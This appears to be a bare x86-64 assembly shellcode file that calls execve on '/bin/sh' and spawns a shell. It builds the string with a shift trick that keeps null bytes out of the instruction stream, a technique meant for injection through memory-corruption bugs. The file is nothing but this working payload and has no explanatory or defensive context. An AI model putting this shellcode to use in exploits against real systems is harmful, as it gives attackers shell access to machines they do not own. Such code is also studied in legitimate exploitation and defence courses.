.section .data

.section .text

.globl _start

_start:
	xor %rsi, %rsi
	xor %rdx, %rdx
	movq $0x1168732f6e69622f, %rbx
	shl $0x08, %rbx
	shr $0x08, %rbx
	pushq %rbx
	xor %rax, %rax
	movb $59, %al
	movq %rsp, %rdi
	syscall

